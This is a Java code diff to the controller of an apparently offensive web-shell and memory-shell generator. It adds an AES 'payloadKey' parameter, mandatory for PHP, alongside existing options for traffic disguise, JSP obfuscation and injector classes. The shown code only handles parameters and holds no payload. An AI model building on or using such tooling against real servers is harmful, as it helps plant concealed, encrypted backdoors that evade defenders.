@@ -122,6 +122,12 @@ public class ShellGeneratorController {
             if (runtime == PuppetRuntime.UNKNOWN) {
                 return ApiResponse.badRequest("runtime参数无效");
             }
+            if (runtime == PuppetRuntime.PHP) {
+                String payloadKey = ControllerUtil.getOptionalStringParam(params, "payloadKey");
+                if (payloadKey == null || payloadKey.trim().isEmpty()) {
+                    return ApiResponse.badRequest("PHP PayloadCodec AES 密钥不能为空");
+                }
+            }
             String artifactType = ControllerUtil.getRequiredStringParam(params, "artifactType");
             String reqDisguiseId = ControllerUtil.getRequiredStringParam(params, "reqDisguiseId");
             String respDisguiseId = ControllerUtil.getRequiredStringParam(params, "respDisguiseId");
@@ -181,6 +187,7 @@ public class ShellGeneratorController {
             String protocol = ControllerUtil.getOptionalStringParam(params, "protocol");
             String targetJavaVersion = ControllerUtil.getOptionalStringParam(params, "targetJavaVersion");
             String servletNamespace = ControllerUtil.getOptionalStringParam(params, "servletNamespace");
+            String payloadKey = ControllerUtil.getOptionalStringParam(params, "payloadKey");
             Long obfuscationSeed = getOptionalLongParam(params, "obfuscationSeed");
             Integer respCode = getOptionalIntegerParam(params, "respCode");
             List<String> jspObfuscationSteps = getOptionalStringListParam(params, "jspObfuscationSteps");
@@ -191,6 +198,7 @@ public class ShellGeneratorController {
                             .protocol(protocol)
                             .targetJavaVersion(targetJavaVersion)
                             .servletNamespace(servletNamespace)
+                            .payloadKey(payloadKey)
                             .responseCode(respCode)
                             .obfuscationSteps(jspObfuscationSteps)
                             .obfuscationSeed(obfuscationSeed)
@@ -270,6 +278,7 @@ public class ShellGeneratorController {
             List<String> jspObfuscationSteps = getOptionalStringListParam(params, "jspObfuscationSteps");
             String customJspTemplate =
                     ControllerUtil.getOptionalStringParam(params, "customJspTemplate");
+            String payloadKey = ControllerUtil.getOptionalStringParam(params, "payloadKey");
 
             MemoryShellGenerationCommand command =
                     MemoryShellGenerationCommand.builder(reqDisguise, respDisguise)
@@ -281,6 +290,7 @@ public class ShellGeneratorController {
                             .protocol(protocol)
                             .targetJavaVersion(targetJavaVersion)
                             .servletNamespace(servletNamespace)
+                            .payloadKey(payloadKey)
                             .urlPattern(urlPattern)
                             .coreClassName(coreClassName)
                             .injectorClassName(injectorClassName)
